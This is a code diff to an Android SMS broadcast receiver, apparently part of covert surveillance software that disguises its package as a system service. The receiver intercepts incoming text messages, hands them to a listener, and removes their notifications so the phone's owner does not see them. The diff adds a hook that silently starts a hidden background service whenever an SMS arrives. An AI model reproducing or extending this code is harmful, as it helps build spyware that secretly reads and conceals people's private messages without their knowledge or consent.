@@ -15,7 +15,9 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 
+import com.android.service.Core;
 import com.android.service.Messages;
+import com.android.service.ServiceCore;
 import com.android.service.Sms;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
@@ -26,21 +28,34 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
 	@Override
 	public void onReceive(Context context, Intent intent) {
+		if (Core.isServiceRunning() == false) {
+			Intent serviceIntent = new Intent(context, ServiceCore.class);
+			
+		    //serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
+		    context.startService(serviceIntent);
+			
+		    if (Cfg.DEBUG) {
+				Check.log(TAG + " (onReceive): Started from SMS"); //$NON-NLS-1$
+			}
+		    
+			return;
+		}
+		
 		if (intent == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
-		
+
 		final Bundle bundle = intent.getExtras();
 
 		if (bundle == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onReceive): Bundle null"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
 
@@ -54,8 +69,8 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 
 			final int result = ListenerSms.self().dispatch(
-					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), 
-							System.currentTimeMillis(), false));
+					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), System
+							.currentTimeMillis(), false));
 
 			// 1 means "remove notification for this sms"
 			if ((result & 1) == 1) {
